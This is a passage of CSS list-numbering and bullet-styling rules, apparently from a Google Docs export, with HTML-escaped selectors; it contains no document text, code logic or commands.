"}.lst-kix_hisa166i97g-4&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-4}.lst-kix_aue93cd1tacp-1&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-1}.lst-kix_hmo7gyj5poo-0&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-0,decimal) ". "}.lst-kix_hmo7gyj5poo-7&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-7}ol.lst-kix_hmo7gyj5poo-1.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-1 0}.lst-kix_hmo7gyj5poo-2&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-2,lower-roman) ". "}ol.lst-kix_f1zwtsa21lze-8.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-8 0}.lst-kix_gavezx7jyt0h-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_ct3zb543qdjl-3.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-3 0}ol.lst-kix_hisa166i97g-3.start{counter-reset:lst-ctn-kix_hisa166i97g-3 0}.lst-kix_u10h5r66zlog-2&gt;li:before{content:"\0025a0  "}.lst-kix_gavezx7jyt0h-0&gt;li:before{content:"\0025cf  "}.lst-kix_f1zwtsa21lze-6&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-6,decimal) ". "}.lst-kix_mqtiiergx266-8&gt;li:before{content:"\0025a0  "}.lst-kix_u10h5r66zlog-0&gt;li:before{content:"\0025cf  "}.lst-kix_f1zwtsa21lze-8&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-8,lower-roman) ". "}.lst-kix_ha0mdd7f5mn8-6&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-6}.lst-kix_mqtiiergx266-6&gt;li:before{content:"\0025cf  "}.lst-kix_yvc47pi19nhn-6&gt;li:before{content:"\0025cf  "}.lst-kix_ezf2mrk385uq-5&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-5,lower-roman) ". "}.lst-kix_ezf2mrk385uq-7&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-7}.lst-kix_ct3zb543qdjl-8&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-8}.lst-kix_f1zwtsa21lze-2&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-2,lower-roman) ". "}.lst-kix_ezf2mrk385uq-4&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-4,lower-latin) ". "}ol.lst-kix_2zj51yim977x-1.start{counter-reset:lst-ctn-kix_2zj51yim977x-1 0}.lst-kix_ezf2mrk385uq-1&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-1,lower-latin) ". "}ol.lst-kix_f1zwtsa21lze-5.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-5 0}.lst-kix_f1zwtsa21lze-1&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-1,lower-latin) ". "}ol.lst-kix_ha0mdd7f5mn8-5.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-5 0}.lst-kix_ezf2mrk385uq-0&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-0,decimal) ". "}.lst-kix_hmo7gyj5poo-0&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-0}.lst-kix_gavezx7jyt0h-7&gt;li:before{content:"\0025cb  "}.lst-kix_2zj51yim977x-0&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-0}.lst-kix_ha0mdd7f5mn8-7&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-7}ol.lst-kix_ct3zb543qdjl-8.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-8 0}ol.lst-kix_f1zwtsa21lze-0{list-style-type:none}ol.lst-kix_f1zwtsa21lze-1{list-style-type:none}ol.lst-kix_f1zwtsa21lze-2{list-style-type:none}ol.lst-kix_f1zwtsa21lze-3{list-style-type:none}ol.lst-kix_2zj51yim977x-7.start{counter-reset:lst-ctn-kix_2zj51yim977x-7 0}ol.lst-kix_f1zwtsa21lze-4{list-style-type:none}.lst-kix_ezf2mrk385uq-8&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-8,lower-roman) ". "}ol.lst-kix_f1zwtsa21lze-5{list-style-type:none}ol.lst-kix_f1zwtsa21lze-6{list-style-type:none}ol.lst-kix_f1zwtsa21lze-7{list-style-type:none}ol.lst-kix_aue93cd1tacp-3.start{counter-reset:lst-ctn-kix_aue93cd1tacp-3 0}ol.lst-kix_f1zwtsa21lze-8{list-style-type:none}ol.lst-kix_aue93cd1tacp-2.start{counter-reset:lst-ctn-kix_aue93cd1tacp-2 0}.lst-kix_2zj51yim977x-1&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-1,lower-latin) ". "}.lst-kix_2zj51yim977x-0&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-0,decimal) ". "}ol.lst-kix_ha0mdd7f5mn8-0.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-0 0}ol.lst-kix_ezf2mrk385uq-2.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-2 0}ul.lst-kix_33m87cusbobo-1{list-style-type:none}ul.lst-kix_33m87cusbobo-0{list-style-type:none}ol.lst-kix_2zj51yim977x-2.start{counter-reset:lst-ctn-kix_2zj51yim977x-2 0}.lst-kix_2zj51yim977x-8&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-8,lower-roman) ". "}ol.lst-kix_ct3zb543qdjl-7.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-7 0}ol.lst-kix_f1zwtsa21lze-4.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-4 0}ul.lst-kix_mqtiiergx266-4{list-style-type:none}ul.lst-kix_mqtiiergx266-3{list-style-type:none}ol.lst-kix_ezf2mrk385uq-1.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-1 0}ol.lst-kix_ha0mdd7f5mn8-6.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-6 0}ul.lst-kix_mqtiiergx266-2{list-style-type:none}ul.lst-kix_mqtiiergx266-1{list-style-type:none}ul.lst-kix_mqtiiergx266-0{list-style-type:none}.lst-kix_2zj51yim977x-4&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-4,lower-latin) ". "}.lst-kix_2zj51yim977x-7&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-7}ul.lst-kix_33m87cusbobo-7{list-style-type:none}ul.lst-kix_33m87cusbobo-6{list-style-type:none}.lst-kix_2zj51yim977x-5&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-5,lower-roman) ". "}ol.lst-kix_aue93cd1tacp-8.start{counter-reset:lst-ctn-kix_aue93cd1tacp-8 0}ul.lst-kix_33m87cusbobo-8{list-style-type:none}ul.lst-kix_mqtiiergx266-8{list-style-type:none}ul.lst-kix_33m87cusbobo-3{list-style-type:none}ul.lst-kix_mqtiiergx266-7{list-style-type:none}ul.lst-kix_33m87cusbobo-2{list-style-type:none}ul.lst-kix_mqtiiergx266-6{list-style-type:none}ul.lst-kix_33m87cusbobo-5{list-style-type:none}ul.lst-kix_mqtiiergx266-5{list-style-type:none}ul.lst-kix_33m87cusbobo-4{list-style-type:none}.lst-kix_a7picbopwap5-4&gt;li:before{content:"\0025cb  "}.lst-kix_ha0mdd7f5mn8-2&gt;li:before{content:"" counter(lst-ctn-kix_ha0mdd7f5mn8-2,lower-roman) ") "}ol.lst-kix_aue93cd1tacp-4.start{counter-reset:lst-ctn-kix_aue93cd1tacp-4 0}.lst-kix_xkot2rd1rwjd-2&gt;li:before{content:"\0025a0  "}.lst-kix_xkot2rd1rwjd-6&gt;li:before{content:"\0025cf  "}.lst-kix_f1zwtsa21lze-1&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-1}.lst-kix_a7picbopwap5-0&gt;li:before{content:"\0025cf  "}.lst-kix_a7picbopwap5-8&gt;li:before{content:"\0025a0  "}.lst-kix_hisa166i97g-2&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-2}ol.lst-kix_2zj51yim977x-5.start{counter-reset:lst-ctn-kix_2zj51yim977x-5 0}.lst-kix_33m87cusbobo-1&gt;li:before{content:"\0025cb  "}.lst-kix_2zj51yim977x-5&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-5}.lst-kix_5fvsno8h94t-3&gt;li:before{content:"\0025cf  "}.lst-kix_ju6nxsiwjdzc-2&gt;li:before{content:"\0025a0  "}.lst-kix_33m87cusbobo-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_ezf2mrk385uq-0.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-0 0}.lst-kix_ezf2mrk385uq-2&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-2}.lst-kix_ju6nxsiwjdzc-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_aue93cd1tacp-7.start{counter-reset:lst-ctn-kix_aue93cd1tacp-7 0}ol.lst-kix_2zj51yim977x-8.start{counter-reset:lst-ctn-kix_2zj51yim977x-8 0}.lst-kix_hmo7gyj5poo-7&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-7,lower-latin) ". "}.lst-kix_f1zwtsa21lze-3&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-3}.lst-kix_5fvsno8h94t-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_gavezx7jyt0h-8{list-style-type:none}.lst-kix_ha0mdd7f5mn8-4&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-4}ul.lst-kix_gavezx7jyt0h-4{list-style-type:none}ul.lst-kix_gavezx7jyt0h-5{list-style-type:none}.lst-kix_ha0mdd7f5mn8-2&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-2}ul.lst-kix_gavezx7jyt0h-6{list-style-type:none}ul.lst-kix_gavezx7jyt0h-7{list-style-type:none}ul.lst-kix_gavezx7jyt0h-0{list-style-type:none}ul.lst-kix_gavezx7jyt0h-1{list-style-type:none}ul.lst-kix_gavezx7jyt0h-2{list-style-type:none}ul.lst-kix_gavezx7jyt0h-3{list-style-type:none}ol.lst-kix_f1zwtsa21lze-3.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-3 0}.lst-kix_ha0mdd7f5mn8-6&gt;li:before{content:"" counter(lst-ctn-kix_ha0mdd7f5mn8-6,decimal) ". "}.lst-kix_hmo7gyj5poo-5&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-5}ol.lst-kix_ha0mdd7f5mn8-1.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-1 0}ol.lst-kix_hisa166i97g-8.start{counter-reset:lst-ctn-kix_hisa166i97g-8 0}.lst-kix_mqtiiergx266-1&gt;li:before{content:"\0025cb  "}.lst-kix_yvc47pi19nhn-7&gt;li:before{content:"\0025cb  "}.lst-kix_ct3zb543qdjl-5&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-5}ol.lst-kix_ha0mdd7f5mn8-4.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-4 0}.lst-kix_yvc47pi19nhn-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_f1zwtsa21lze-0.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-0 0}.lst-kix_u10h5r66zlog-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_2zj51yim977x-6.start{counter-reset:lst-ctn-kix_2zj51yim977x-6 0}.lst-kix_gavezx7jyt0h-3&gt;li:before{content:"\0025cf  "}.lst-kix_u10h5r66zlog-7&gt;li:before{content:"\0025cb  "}.lst-kix_ct3zb543qdjl-7&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-7,lower-latin) ". "}ol.lst-kix_ha0mdd7f5mn8-3.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-3 0}ol.lst-kix_f1zwtsa21lze-1.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-1 0}.lst-kix_aue93cd1tacp-4&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-4}ol.lst-kix_aue93cd1tacp-5.start{counter-reset:lst-ctn-kix_aue93cd1tacp-5 0}.lst-kix_hisa166i97g-7&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-7}.lst-kix_hmo7gyj5poo-3&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-3,decimal) ". "}.lst-kix_f1zwtsa21lze-5&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-5,lower-roman) ". "}.lst-kix_n1wl50guyz1t-2&gt;li:before{content:"\0025a0  "}.lst-kix_n1wl50guyz1t-6&gt;li:before{content:"\0025cf  "}.lst-kix_ct3zb543qdjl-3&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-3,decimal) ". "}.lst-kix_mqtiiergx266-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_2zj51yim977x-1{list-style-type:none}ol.lst-kix_2zj51yim977x-2{list-style-type:none}ol.lst-kix_2zj51yim977x-3{list-style-type:none}.lst-kix_aue93cd1tacp-1&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-1,lower-latin) ". "}ol.lst-kix_2zj51yim977x-4{list-style-type:none}ol.lst-kix_2zj51yim977x-5{list-style-type:none}ol.lst-kix_2zj51yim977x-6{list-style-type:none}ol.lst-kix_2zj51yim977x-7{list-style-type:none}.lst-kix_aue93cd1tacp-2&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-2,lower-roman) ". "}ol.lst-kix_2zj51yim977x-8{list-style-type:none}.lst-kix_1alpl2noeu5i-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_hmo7gyj5poo-5.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-5 0}.lst-kix_aue93cd1tacp-3&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-3,decimal) ". "}.lst-kix_aue93cd1tacp-5&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-5,lower-roman) ". "}.lst-kix_1alpl2noeu5i-2&gt;li:before{content:"\0025a0  "}.lst-kix_1alpl2noeu5i-3&gt;li:before{content:"\0025cf  "}.lst-kix_aue93cd1tacp-4&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-4,lower-latin) ". "}ol.lst-kix_2zj51yim977x-0{list-style-type:none}.lst-kix_ha0mdd7f5mn8-8&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-8}.lst-kix_ezf2mrk385uq-6&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-6}ul.lst-kix_1alpl2noeu5i-1{list-style-type:none}ul.lst-kix_1alpl2noeu5i-0{list-style-type:none}.lst-kix_f1zwtsa21lze-8&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-8}ol.lst-kix_ha0mdd7f5mn8-2.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-2 0}.lst-kix_1alpl2noeu5i-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_f1zwtsa21lze-2.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-2 0}ul.lst-kix_u10h5r66zlog-6{list-style-type:none}ul.lst-kix_u10h5r66zlog-7{list-style-type:none}ul.lst-kix_u10h5r66zlog-8{list-style-type:none}.lst-kix_aue93cd1tacp-0&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-0,decimal) ". "}ul.lst-kix_u10h5r66zlog-2{list-style-type:none}ul.lst-kix_u10h5r66zlog-3{list-style-type:none}ul.lst-kix_u10h5r66zlog-4{list-style-type:none}ul.lst-kix_u10h5r66zlog-5{list-style-type:none}ul.lst-kix_u10h5r66zlog-0{list-style-type:none}ul.lst-kix_u10h5r66zlog-1{list-style-type:none}ol.lst-kix_aue93cd1tacp-0.start{counter-reset:lst-ctn-kix_aue93cd1tacp-0 0}.lst-kix_1alpl2noeu5i-4&gt;li:before{content:"\0025cb  "}.lst-kix_1alpl2noeu5i-5&gt;li:before{content:"\0025a0  "}.lst-kix_aue93cd1tacp-7&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-7,lower-latin) ". "}.lst-kix_ct3zb543qdjl-7&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-7}.lst-kix_aue93cd1tacp-6&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-6,decimal) ". "}.lst-kix_1alpl2noeu5i-8&gt;li:before{content:"\0025a0  "}.lst-kix_1alpl2noeu5i-6&gt;li:before{content:"\0025cf  "}.lst-kix_1alpl2noeu5i-7&gt;li:before{content:"\0025cb  "}.lst-kix_aue93cd1tacp-8&gt;li:before{content:"" counter(lst-ctn-kix_aue93cd1tacp-8,lower-roman) ". "}ol.lst-kix_hisa166i97g-0.start{counter-reset:lst-ctn-kix_hisa166i97g-0 0}ol.lst-kix_2zj51yim977x-3.start{counter-reset:lst-ctn-kix_2zj51yim977x-3 0}ol.lst-kix_hisa166i97g-7.start{counter-reset:lst-ctn-kix_hisa166i97g-7 0}.lst-kix_f1zwtsa21lze-4&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-4}ol.lst-kix_ct3zb543qdjl-6.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-6 0}.lst-kix_ct3zb543qdjl-0&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-0}ol.lst-kix_ha0mdd7f5mn8-7.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-7 0}.lst-kix_hisa166i97g-8&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-8,lower-roman) ". "}.lst-kix_aue93cd1tacp-6&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-6}.lst-kix_ha0mdd7f5mn8-1&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-1}.lst-kix_hisa166i97g-1&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-1,lower-latin) ". "}.lst-kix_hisa166i97g-2&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-2,lower-roman) ". "}.lst-kix_hisa166i97g-0&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-0,decimal) ". "}.lst-kix_hisa166i97g-4&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-4,lower-latin) ". "}.lst-kix_hisa166i97g-5&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-5,lower-roman) ". "}ul.lst-kix_ju6nxsiwjdzc-7{list-style-type:none}ul.lst-kix_ju6nxsiwjdzc-6{list-style-type:none}ul.lst-kix_ju6nxsiwjdzc-8{list-style-type:none}.lst-kix_hisa166i97g-7&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-7,lower-latin) ". "}ul.lst-kix_ju6nxsiwjdzc-3{list-style-type:none}ul.lst-kix_ju6nxsiwjdzc-2{list-style-type:none}.lst-kix_hisa166i97g-6&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-6,decimal) ". "}ul.lst-kix_ju6nxsiwjdzc-5{list-style-type:none}ul.lst-kix_ju6nxsiwjdzc-4{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-8{list-style-type:none}ul.lst-kix_ju6nxsiwjdzc-1{list-style-type:none}ul.lst-kix_ju6nxsiwjdzc-0{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-0{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-1{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-2{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-3{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-4{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-5{list-style-type:none}.lst-kix_hisa166i97g-3&gt;li:before{content:"" counter(lst-ctn-kix_hisa166i97g-3,decimal) ". "}ol.lst-kix_ha0mdd7f5mn8-6{list-style-type:none}ol.lst-kix_ha0mdd7f5mn8-7{list-style-type:none}.lst-kix_2zj51yim977x-1&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-1}.lst-kix_a7picbopwap5-5&gt;li:before{content:"\0025a0  "}.lst-kix_xkot2rd1rwjd-3&gt;li:before{content:"\0025cf  "}.lst-kix_xkot2rd1rwjd-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_hisa166i97g-0{list-style-type:none}.lst-kix_aue93cd1tacp-2&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-2}.lst-kix_a7picbopwap5-1&gt;li:before{content:"\0025cb  "}.lst-kix_5fvsno8h94t-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_hisa166i97g-5.start{counter-reset:lst-ctn-kix_hisa166i97g-5 0}.lst-kix_a7picbopwap5-7&gt;li:before{content:"\0025cb  "}.lst-kix_5fvsno8h94t-2&gt;li:before{content:"\0025a0  "}.lst-kix_5fvsno8h94t-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_hisa166i97g-2.start{counter-reset:lst-ctn-kix_hisa166i97g-2 0}ol.lst-kix_ct3zb543qdjl-4.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-4 0}ul.lst-kix_a7picbopwap5-1{list-style-type:none}ol.lst-kix_hisa166i97g-4{list-style-type:none}ul.lst-kix_a7picbopwap5-2{list-style-type:none}ol.lst-kix_hisa166i97g-3{list-style-type:none}ol.lst-kix_ct3zb543qdjl-1.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-1 0}ol.lst-kix_hisa166i97g-2{list-style-type:none}.lst-kix_ct3zb543qdjl-3&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-3}.lst-kix_xkot2rd1rwjd-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_a7picbopwap5-0{list-style-type:none}ol.lst-kix_hisa166i97g-1{list-style-type:none}.lst-kix_a7picbopwap5-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_hisa166i97g-8{list-style-type:none}ol.lst-kix_hisa166i97g-7{list-style-type:none}ol.lst-kix_hisa166i97g-6{list-style-type:none}ol.lst-kix_hisa166i97g-5{list-style-type:none}ul.lst-kix_a7picbopwap5-7{list-style-type:none}ul.lst-kix_a7picbopwap5-8{list-style-type:none}ol.lst-kix_ezf2mrk385uq-3.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-3 0}ul.lst-kix_a7picbopwap5-5{list-style-type:none}ul.lst-kix_a7picbopwap5-6{list-style-type:none}.lst-kix_f1zwtsa21lze-0&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-0}ul.lst-kix_a7picbopwap5-3{list-style-type:none}ul.lst-kix_a7picbopwap5-4{list-style-type:none}.lst-kix_5fvsno8h94t-6&gt;li:before{content:"\0025cf  "}.lst-kix_5fvsno8h94t-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_hmo7gyj5poo-3.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-3 0}.lst-kix_hisa166i97g-5&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-5}.lst-kix_hmo7gyj5poo-8&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-8}.lst-kix_xkot2rd1rwjd-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_hmo7gyj5poo-0.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-0 0}ol.lst-kix_f1zwtsa21lze-7.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-7 0}.lst-kix_2zj51yim977x-8&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-8}.lst-kix_ha0mdd7f5mn8-0&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-0}.lst-kix_f1zwtsa21lze-5&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-5}ol.lst-kix_2zj51yim977x-0.start{counter-reset:lst-ctn-kix_2zj51yim977x-0 0}.lst-kix_hmo7gyj5poo-1&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-1}ol.lst-kix_ezf2mrk385uq-5.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-5 0}.lst-kix_ct3zb543qdjl-6&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-6,decimal) ". "}ul.lst-kix_1alpl2noeu5i-5{list-style-type:none}ul.lst-kix_1alpl2noeu5i-4{list-style-type:none}ul.lst-kix_1alpl2noeu5i-3{list-style-type:none}.lst-kix_aue93cd1tacp-7&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-7}ul.lst-kix_1alpl2noeu5i-2{list-style-type:none}ul.lst-kix_1alpl2noeu5i-8{list-style-type:none}.lst-kix_n1wl50guyz1t-7&gt;li:before{content:"\0025cb  "}.lst-kix_ct3zb543qdjl-0&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-0,decimal) ". "}.lst-kix_ct3zb543qdjl-8&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-8,lower-roman) ". "}ul.lst-kix_1alpl2noeu5i-7{list-style-type:none}ul.lst-kix_1alpl2noeu5i-6{list-style-type:none}.lst-kix_n1wl50guyz1t-1&gt;li:before{content:"\0025cb  "}.lst-kix_n1wl50guyz1t-5&gt;li:before{content:"\0025a0  "}.lst-kix_ct3zb543qdjl-2&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-2,lower-roman) ". "}.lst-kix_n1wl50guyz1t-3&gt;li:before{content:"\0025cf  "}.lst-kix_ct3zb543qdjl-4&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-4,lower-latin) ". "}.lst-kix_ezf2mrk385uq-6&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-6,decimal) ". "}.lst-kix_f1zwtsa21lze-7&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-7}.lst-kix_ezf2mrk385uq-2&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-2,lower-roman) ". "}.lst-kix_f1zwtsa21lze-3&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-3,decimal) ". "}.lst-kix_f1zwtsa21lze-4&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-4,lower-latin) ". "}.lst-kix_ezf2mrk385uq-3&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-3,decimal) ". "}ol.lst-kix_ezf2mrk385uq-7.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-7 0}.lst-kix_f1zwtsa21lze-0&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-0,decimal) ". "}ol.lst-kix_hmo7gyj5poo-2.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-2 0}.lst-kix_gavezx7jyt0h-8&gt;li:before{content:"\0025a0  "}.lst-kix_ezf2mrk385uq-5&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-5}ol.lst-kix_ct3zb543qdjl-2.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-2 0}.lst-kix_hisa166i97g-8&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-8}.lst-kix_hmo7gyj5poo-2&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-2}.lst-kix_ezf2mrk385uq-7&gt;li:before{content:"" counter(lst-ctn-kix_ezf2mrk385uq-7,lower-latin) ". "}ol.lst-kix_hmo7gyj5poo-6{list-style-type:none}ul.lst-kix_yvc47pi19nhn-0{list-style-type:none}ol.lst-kix_hmo7gyj5poo-5{list-style-type:none}ul.lst-kix_yvc47pi19nhn-1{list-style-type:none}ol.lst-kix_hmo7gyj5poo-8{list-style-type:none}ul.lst-kix_yvc47pi19nhn-2{list-style-type:none}ol.lst-kix_hmo7gyj5poo-7{list-style-type:none}ul.lst-kix_yvc47pi19nhn-3{list-style-type:none}ul.lst-kix_yvc47pi19nhn-4{list-style-type:none}ul.lst-kix_yvc47pi19nhn-5{list-style-type:none}ul.lst-kix_yvc47pi19nhn-6{list-style-type:none}ol.lst-kix_hmo7gyj5poo-0{list-style-type:none}ol.lst-kix_hmo7gyj5poo-2{list-style-type:none}ol.lst-kix_hmo7gyj5poo-1{list-style-type:none}ol.lst-kix_hmo7gyj5poo-4{list-style-type:none}ol.lst-kix_hmo7gyj5poo-3{list-style-type:none}.lst-kix_ha0mdd7f5mn8-5&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-5}.lst-kix_hisa166i97g-6&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-6}ul.lst-kix_yvc47pi19nhn-7{list-style-type:none}ul.lst-kix_yvc47pi19nhn-8{list-style-type:none}.lst-kix_aue93cd1tacp-0&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-0}.lst-kix_ct3zb543qdjl-6&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-6}ol.lst-kix_ezf2mrk385uq-8.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-8 0}.lst-kix_2zj51yim977x-2&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-2,lower-roman) ". "}.lst-kix_2zj51yim977x-3&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-3,decimal) ". "}.lst-kix_2zj51yim977x-4&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-4}.lst-kix_2zj51yim977x-6&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-6,decimal) ". "}.lst-kix_2zj51yim977x-7&gt;li:before{content:"" counter(lst-ctn-kix_2zj51yim977x-7,lower-latin) ". "}.lst-kix_ezf2mrk385uq-1&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-1}.lst-kix_ha0mdd7f5mn8-0&gt;li:before{content:"" counter(lst-ctn-kix_ha0mdd7f5mn8-0,decimal) ") 